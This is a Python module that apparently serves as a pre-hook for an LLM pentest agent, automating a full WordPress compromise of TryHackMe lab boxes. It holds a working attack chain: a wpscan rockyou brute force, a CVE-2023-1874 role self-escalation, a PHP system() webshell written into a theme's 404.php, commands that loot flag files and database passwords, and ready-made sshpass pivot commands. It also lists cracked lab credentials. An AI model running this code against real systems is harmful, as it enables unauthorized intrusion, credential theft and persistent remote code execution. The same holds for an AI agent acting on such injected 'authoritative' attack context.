"""WordPress deterministic foothold pre_hook (F204).

Runs the full WordPress foothold DETERMINISTICALLY before the LLM gets control, so the chain stops
depending on a small local model reliably driving wpscan -> webshell. 13 live runs on THM Internal each
failed differently (Ornith-9B variance: sometimes drives wpscan, sometimes loops recon, sometimes explores
Jenkins) even though every step is validated in isolation. This hook makes the foothold a deterministic
fact the agent builds on instead of a coin-flip it has to execute:

  1. find the WP base (root or /blog...) + the canonical vhost (WordPress siteurl) and seed /etc/hosts;
  2. wpscan rockyou wp-login brute (the cracked admin password — ~114s, generous timeout);
  3. if cracked: wp-admin cookie login -> theme-editor 404.php webshell -> trigger for `id` (www-data);
  4. loot user.txt + /opt + wp-config creds via the webshell.

The return string is injected as authoritative context. Validated live on THM Internal:
admin:my2boys -> uid=33(www-data) -> aubreanna SSH cred in /opt/wp-save.txt.

Banca-safe contract: only reachable via the explicit "active wordpress pentest" keyword + KRYON_RED_TEAM,
written authorization required. Everything before step 3 is read-only; the webshell only fires after a
confirmed crack (no crack -> no write).
"""

from __future__ import annotations

import re
import subprocess
from typing import Any
from urllib.parse import urlparse

_ROCKYOU = "/usr/share/wordlists/rockyou.txt"
_LAB_TLDS = (".thm", ".htb", ".local", ".lan", ".corp", ".internal", ".vm")
_PUBLIC_NEEDLES = (
    "w3.org", "schema.org", "gmpg.org", "wordpress.org", "google", "gstatic", "googleapis",
    "gravatar", "jquery", "cloudflare", "fonts.", "github", "twitter", "facebook", "youtube",
)
_BASES = ("", "/blog", "/wordpress", "/wp", "/cms", "/news")


def _sh(cmd: str, timeout: int) -> str:
    """Run a shell command, return stdout ('' on any error/timeout). Best-effort — a pre_hook must
    never raise into the runner."""
    try:
        return subprocess.run(  # noqa: S602 — fixed offensive commands, target gated by keyword+RED_TEAM
            cmd, shell=True, capture_output=True, text=True, timeout=timeout
        ).stdout
    except Exception:  # noqa: BLE001
        return ""


def _host_of(target: str) -> str:
    target = (target or "").strip()
    if not target:
        return ""
    if "://" not in target:
        target = "http://" + target
    return urlparse(target).hostname or ""


def _find_base(host: str) -> str:
    """Probe the common WordPress mount points; return the first with a WP fingerprint, else ''."""
    for path in _BASES:
        body = _sh(f"curl -s -m6 'http://{host}{path}/' 2>/dev/null", 10)
        if re.search(r"wp-content|wp-includes|wordpress", body, re.I):
            return path
    return ""


def _detect_vhost(host: str, base: str) -> str:
    """Pull a self-referenced lab vhost (WordPress siteurl) out of the page body — the bare IP serves 200
    but every link hard-codes e.g. http://internal.thm/blog/, and wp-login/theme-editor only work there."""
    body = _sh(f"curl -s -m6 'http://{host}{base}/' 2>/dev/null", 10)
    cands: dict[str, int] = {}
    for h in re.findall(r"https?://([A-Za-z0-9][A-Za-z0-9.\-]{1,251})", body):
        h = h.lower().rstrip(".")
        if not h or h == host.lower() or "." not in h or any(p in h for p in _PUBLIC_NEEDLES):
            continue
        cands[h] = cands.get(h, 0) + 1
    lab = [h for h in cands if h.endswith(_LAB_TLDS)]
    if lab:
        return max(lab, key=lambda h: cands[h])
    return max(cands, key=lambda h: cands[h]) if cands else ""


def _crack(vhost: str, base: str) -> tuple[str, str]:
    """wpscan user-enum + rockyou wp-login brute. Returns (user, password) or ('', '')."""
    _sh(f"[ -f {_ROCKYOU} ] || gunzip -kf {_ROCKYOU}.gz 2>/dev/null", 30)
    users = _sh(
        f"wpscan --url 'http://{vhost}{base}/' -e u --no-banner --force 2>/dev/null "
        "| grep -aoiE '^\\| [a-z0-9_.-]+' | tr -d '| ' | sort -u | grep -avE '^$'",
        90,
    )
    userfile = "/tmp/wp_brute_users.txt"
    users = users.strip() or "admin"
    _sh(f"printf '%s\\n' {' '.join(u for u in users.split() if u)[:200] or 'admin'} > {userfile}", 5)
    out = _sh(
        f"wpscan --url 'http://{vhost}{base}/' -U {userfile} -P {_ROCKYOU} "
        "--password-attack wp-login --max-threads 40 --no-banner --force 2>/dev/null",
        300,
    )
    m = re.search(r"Username:\s*([^\s,|]+)\s*,\s*Password:\s*([^\s|]+)", out, re.I)
    if not m:
        m = re.search(r"\[SUCCESS\]\s*-\s*(\S+)\s*/\s*(\S+)", out)
    return (m.group(1), m.group(2)) if m else ("", "")


def _ssh_creds_from_loot(loot_lines: list[str], admin: tuple[str, str]) -> list[tuple[str, str]]:
    """Pull ``user:pass`` pairs out of the loot (e.g. /opt/wp-save.txt's ``aubreanna:bubb13guM!@#123``)
    plus the cracked admin cred, so the report can hand the agent ready-to-run SSH commands instead of
    just the raw cred (the model otherwise runs ``ssh user@host`` with no password mechanism and gets
    denied). Skips URLs and ``KEY: value`` config lines; deduped, order-preserving."""
    creds: list[tuple[str, str]] = [admin]
    for raw in loot_lines:
        ln = raw.strip()
        if "://" in ln or ln.lower().startswith(("http", "db_")):
            continue
        m = re.match(r"^([a-z][a-z0-9_.\-]{1,30}):(\S{4,})$", ln)
        if m:
            creds.append((m.group(1), m.group(2)))
    seen: set[tuple[str, str]] = set()
    uniq: list[tuple[str, str]] = []
    for cred in creds:
        if cred[1] and cred not in seen:
            seen.add(cred)
            uniq.append(cred)
    return uniq[:5]


def _escalate_wpda(vhost: str, base: str, ck: str) -> bool:
    """CVE-2023-1874: WP Data Access <=5.3.8 lets a Subscriber self-assign the administrator role via an
    unchecked wpda_role[] field on the profile update. When the cracked user is low-priv (theme-editor 403),
    self-escalate so the theme-editor webshell becomes reachable. Harmless if the plugin is absent (the param
    is just ignored). Returns True if admin landed. Found validating THM Breakme (bob:soccer subscriber)."""
    prof = _sh(f"curl -s -b {ck} 'http://{vhost}{base}/wp-admin/profile.php' 2>/dev/null", 12)
    uid_m = re.search(r'name="user_id"[^>]*value="(\d+)"', prof)
    nonce_m = re.search(r'name="_wpnonce" value="([a-f0-9]+)"', prof)
    if not (uid_m and nonce_m):
        return False
    uid, nonce = uid_m.group(1), nonce_m.group(1)
    _sh(
        f"curl -s -b {ck} 'http://{vhost}{base}/wp-admin/profile.php' "
        f"--data-urlencode '_wpnonce={nonce}' --data-urlencode action=update "
        f"--data-urlencode 'user_id={uid}' --data-urlencode 'checkuser_id={uid}' "
        "--data-urlencode 'wpda_role[]=administrator' -o /dev/null 2>/dev/null",
        15,
    )
    code = _sh(
        f"curl -s -b {ck} -o /dev/null -w '%{{http_code}}' "
        f"'http://{vhost}{base}/wp-admin/theme-editor.php' 2>/dev/null",
        12,
    ).strip()
    return code == "200"


def _webshell_and_loot(vhost: str, base: str, user: str, pw: str, host: str) -> str:
    """wp-admin login -> theme-editor 404.php webshell -> trigger for id -> loot. Returns a report block."""
    ck = "/tmp/wp_brute_cookie"
    login = (
        f"curl -s -c {ck} -b 'wordpress_test_cookie=WP Cookie check' "
        f"--data-urlencode 'log={user}' --data-urlencode 'pwd={pw}' --data-urlencode 'wp-submit=Log In' "
        f"--data-urlencode 'redirect_to=http://{vhost}{base}/wp-admin/' --data-urlencode 'testcookie=1' "
        f"'http://{vhost}{base}/wp-login.php' -o /dev/null 2>/dev/null; grep -aq wordpress_logged_in {ck} && echo OK"
    )
    if "OK" not in _sh(login, 20):
        return "  - wp-admin login FAILED with the cracked cred (vhost/redirect issue?) — webshell skipped"
    # If the cracked user is low-priv (theme-editor 403), try CVE-2023-1874 (WP Data Access) to self-escalate
    # to administrator before falling back. The webshell path below needs admin to reach theme-editor.
    escalated = ""
    te_code = _sh(
        f"curl -s -b {ck} -o /dev/null -w '%{{http_code}}' "
        f"'http://{vhost}{base}/wp-admin/theme-editor.php' 2>/dev/null",
        12,
    ).strip()
    if te_code == "403" and _escalate_wpda(vhost, base, ck):
        escalated = "  - escalated Subscriber->admin via CVE-2023-1874 (WP Data Access wpda_role[])\n"
    te = _sh(f"curl -s -b {ck} 'http://{vhost}{base}/wp-admin/theme-editor.php?file=404.php' 2>/dev/null", 15)
    th_m = re.search(r"theme=([a-z0-9-]+)", te)
    theme = th_m.group(1) if th_m else "twentyseventeen"
    n_m = re.search(r'id="nonce" name="nonce" value="([a-f0-9]+)"', te) or re.search(
        r'name="_wpnonce" value="([a-f0-9]+)"', te
    )
    nonce = n_m.group(1) if n_m else ""
    _sh(
        f"curl -s -b {ck} 'http://{vhost}{base}/wp-admin/theme-editor.php' "
        f"--data-urlencode 'nonce={nonce}' --data-urlencode '_wpnonce={nonce}' "
        f"--data-urlencode '_wp_http_referer={base}/wp-admin/theme-editor.php?file=404.php&theme={theme}' "
        "--data-urlencode 'newcontent=<?php if(isset($_REQUEST[0])){system($_REQUEST[0]);die;} ?>' "
        f"--data-urlencode action=update --data-urlencode file=404.php --data-urlencode 'theme={theme}' "
        "--data-urlencode scrollto=0 -o /dev/null 2>/dev/null",
        20,
    )
    shell = f"http://{vhost}{base}/wp-content/themes/{theme}/404.php"
    uid = _sh(f"curl -s -G '{shell}' --data-urlencode '0=id' 2>/dev/null | grep -aoE 'uid=[0-9][^<]*'", 15).strip()
    if not uid:
        return escalated + f"  - webshell did not respond at {theme}/404.php (try another theme/file manually)"
    loot = _sh(
        f"curl -s -G '{shell}' --data-urlencode '0=id; hostname; "
        "find / -name user.txt 2>/dev/null | head -2 | xargs -r cat; "
        'cat /opt/*.txt /opt/*/*.txt 2>/dev/null; grep -rhiE \"DB_(USER|PASSWORD)|password\" /var/www 2>/dev/null | head\' '
        "2>/dev/null | grep -aivE '<|^$' | head -25",
        25,
    )
    loot_lines = loot.splitlines()[:25]
    block = escalated + f"  - RCE as {uid}\n  - webshell: {shell}?0=<cmd>\n  - loot:\n" + "\n".join(
        "      " + ln for ln in loot_lines
    )
    # Hand the agent ready-to-run SSH pivots (with the password passed via sshpass) for every looted cred,
    # so it doesn't fall back to a passwordless `ssh user@host` that just gets "Permission denied". SSH is
    # on the bare host (the IP), not the WordPress vhost.
    ssh_creds = _ssh_creds_from_loot(loot_lines, (user, pw))
    if ssh_creds:
        block += "\n  - READY SSH pivots (looted creds, run as-is — password is passed, no prompt):\n"
        for su, sp in ssh_creds:
            block += (
                f"      sshpass -p '{sp}' ssh -F /dev/null -o StrictHostKeyChecking=no "
                f"-o ConnectTimeout=8 {su}@{host} 'id; hostname; cat ~/user.txt 2>/dev/null; sudo -n -l 2>/dev/null'\n"
            )
    return block


def run(ctx: dict[str, Any]) -> str:
    """Deterministic WordPress foothold. Returns an authoritative-context report string."""
    host = _host_of(ctx.get("target") or ctx.get("host") or "")
    if not host:
        return "[WP-BRUTE] no target host in ctx — skipped"

    base = _find_base(host)
    if base is None or (base == "" and not re.search(
        r"wp-content|wordpress", _sh(f"curl -s -m6 'http://{host}/' 2>/dev/null", 10), re.I
    )):
        # _find_base returns '' for docroot WP too; only bail when NO mount fingerprinted
        body_any = any(
            re.search(r"wp-content|wp-includes", _sh(f"curl -s -m6 'http://{host}{p}/' 2>/dev/null", 8), re.I)
            for p in _BASES
        )
        if not body_any:
            return f"[WP-BRUTE] no WordPress fingerprint at http://{host}{{,/blog,/wp,...}} — not WordPress"

    vhost = _detect_vhost(host, base) or host
    if vhost != host:
        _sh(f"grep -q '{vhost}' /etc/hosts 2>/dev/null || echo '{host} {vhost}' | sudo -n tee -a /etc/hosts >/dev/null 2>&1 "
            f"|| echo '{host} {vhost}' >> /etc/hosts 2>/dev/null", 10)

    user, pw = _crack(vhost, base)
    head = (
        f"[WP-BRUTE deterministic foothold] target=http://{vhost}{base}/  (vhost {vhost} seeded to /etc/hosts)\n"
    )
    if not user:
        return head + "  - no weak admin password found (rockyou wp-login). Try a larger list or a plugin CVE."
    report = head + f"  - CRACKED WordPress admin: {user}:{pw}\n"
    report += _webshell_and_loot(vhost, base, user, pw, host)
    report += (
        "\nThese are CONFIRMED facts from a real run — do NOT re-brute. Build on them: pivot with any "
        "looted SSH/DB creds, then enumerate the www-data shell for privesc."
    )
    return report
